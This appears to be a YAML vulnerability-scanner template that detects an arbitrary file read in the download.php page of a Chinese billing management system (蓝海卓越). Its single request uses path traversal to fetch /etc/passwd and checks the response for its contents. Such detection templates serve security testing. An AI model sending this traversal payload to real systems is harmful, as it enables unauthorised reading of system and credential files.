id: poc-yaml-lhzy-billing-management-system-download-php-file-read
info:
  name: 蓝海卓越 计费管理系统 download.php 任意文件读取漏洞
  severity: high
  tags:
  - 文件读取
  finger: 蓝海卓越计费管理系统
requests:
- method: GET
  path: /download.php?file=../../../../../etc/passwd
  expression: status_code == 200 && contains(body,"root:") && contains(body,"/bin")
    && !contains(body,"<")
variables: {}
transport: http
